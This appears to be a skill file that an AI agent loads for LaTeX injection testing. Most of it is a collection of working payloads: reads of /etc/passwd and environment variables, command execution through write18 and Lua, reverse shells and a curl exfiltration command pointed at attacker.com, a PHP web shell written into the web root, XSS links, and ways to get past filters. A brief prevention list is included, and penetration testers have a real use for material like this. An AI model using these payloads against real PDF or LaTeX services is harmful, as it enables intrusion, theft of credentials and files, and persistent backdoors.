---
name: latex
description: LaTeX injection for file read, command execution, and XSS. Use when testing LaTeX/PDF generation.
---

# LaTeX Injection

## Description
LaTeX is a document preparation system with powerful capabilities including file I/O and command execution. When applications process user-supplied LaTeX code without proper sanitization, attackers can read files, write files, and potentially execute system commands.

## File Reading

### Basic File Read
```latex
\input{/etc/passwd}
\include{/etc/passwd}
```

### Using lstinputlisting
```latex
\lstinputlisting{/etc/passwd}
```

### Read Multiple Lines
```latex
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

### Catcode Manipulation (Bypass filters)
```latex
\catcode`\\=12
\catcode`\#=12
\input{/etc/passwd}
```

### Using verbatim
```latex
\verbatiminput{/etc/passwd}
```

## Command Execution

### Using write18 (Shell Escape)

**Note:** Requires `-shell-escape` or `--enable-write18` flag

```latex
% Basic command execution
\immediate\write18{id}

% Write output to file, then include
\immediate\write18{id > output.tex}
\input{output.tex}

% Reverse shell
\immediate\write18{bash -i >& /dev/tcp/attacker.com/4444 0>&1}
```

### Base64 Encoding for Complex Output
```latex
\immediate\write18{cat /etc/passwd | base64 > output.tex}
\input{output.tex}

% Or for environment variables
\immediate\write18{env | base64 > test.tex}
\input{test.tex}
```

### Using Different Methods
```latex
% Direct execution
\immediate\write18{whoami}

% Using openout
\newwrite\outfile
\immediate\openout\outfile=output.tex
\immediate\write\outfile{Content here}
\immediate\closeout\outfile
```

## Cross-Site Scripting (XSS)

If LaTeX output is rendered as HTML/PDF with JavaScript support:

```latex
% URL-based XSS
\url{javascript:alert(1)}

% Hyperlink XSS
\href{javascript:alert(1)}{Click me}

% href with data URI
\href{data:text/html,<script>alert(1)</script>}{Click}
```

## File Writing

```latex
% Write to file
\newwrite\outfile
\immediate\openout\outfile=shell.php
\immediate\write\outfile{<?php system($_GET['cmd']); ?>}
\immediate\closeout\outfile

% Or using write18
\immediate\write18{echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php}
```

## Bypass Techniques

### Unicode Hex Values
```latex
% Bypass character restrictions using ^^
^^5c = \
^^69 = i
^^6e = n
^^70 = p
^^75 = u
^^74 = t

% ^^5cinput becomes \input
^^5c^^69^^6e^^70^^75^^74{/etc/passwd}
```

### Deactivate Control Characters
```latex
% For reading files with special characters
\catcode`\$=12
\catcode`\%=12
\catcode`\#=12
\catcode`\&=12
\catcode`\_=12
\input{file_with_special_chars}
```

### Alternative Commands
```latex
% Different input methods
\@@input{/etc/passwd}
\input|"cat /etc/passwd"

% Using TeX primitives
\openin5=/etc/passwd
\read5 to \myline
\myline
```

### Nested Document
```latex
% Include external document
\include{path/to/file}
\input{path/to/file}

% External bibliography
\bibliography{../../../etc/passwd}
```

## Detection of LaTeX Engine

```latex
% Detect if pdfLaTeX, XeLaTeX, or LuaLaTeX
\ifx\directlua\undefined
  % Not LuaLaTeX
\else
  % LuaLaTeX - more powerful
  \directlua{os.execute("id")}
\fi
```

## LuaLaTeX Specific

```latex
% Direct Lua execution
\directlua{os.execute("id")}

% Read file via Lua
\directlua{
  local f = io.open("/etc/passwd", "r")
  local content = f:read("*all")
  f:close()
  tex.print(content)
}
```

## Common Vulnerable Scenarios

### PDF Generation Services
```
- Resume builders
- Invoice generators
- Certificate generators
- Report generation tools
- Online LaTeX editors
```

### Mathematical Formula Rendering
```
- Math homework platforms
- Scientific publishing tools
- Documentation systems
```

## Exploitation Workflow

### 1. Test for Basic Injection
```latex
% Test if LaTeX is processed
$\frac{1}{2}$
\textbf{test}
```

### 2. Test File Read
```latex
\input{/etc/hostname}
```

### 3. Test Command Execution
```latex
\immediate\write18{id > /tmp/out.txt}
```

### 4. Exfiltrate Data
```latex
% Via DNS
\immediate\write18{curl http://attacker.com/$(cat /etc/passwd | base64)}

% Via file inclusion in generated PDF
\immediate\write18{cat /etc/passwd > included.tex}
\input{included.tex}
```

## Payloads Collection

### File Reading
```latex
\input{/etc/passwd}
\include{/etc/passwd}
\lstinputlisting{/etc/passwd}
\verbatiminput{/etc/passwd}
```

### Command Execution
```latex
\immediate\write18{id}
\immediate\write18{whoami > output.tex}\input{output.tex}
\immediate\write18{cat /etc/passwd | base64 > out.tex}\input{out.tex}
```

### Reverse Shell
```latex
\immediate\write18{bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'}
```

### XSS
```latex
\href{javascript:alert(document.domain)}{Click}
\url{javascript:alert(1)}
```

## Testing Checklist

- [ ] Test basic LaTeX rendering
- [ ] Test file read with \input
- [ ] Test file read with \include
- [ ] Test file read with \lstinputlisting
- [ ] Test command execution with \write18
- [ ] Test XSS via \href and \url
- [ ] Test bypass techniques (catcode, unicode)
- [ ] Check for LuaLaTeX (directlua)
- [ ] Test file write capabilities

## Prevention

```
1. Disable shell-escape mode
2. Use restricted mode (--no-shell-escape)
3. Sandbox LaTeX processing
4. Whitelist allowed commands
5. Filter dangerous commands: \input, \include, \write18
6. Use Docker containers for isolation
7. Implement file access restrictions
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection
- https://0day.work/hacking-with-latex/
- https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/
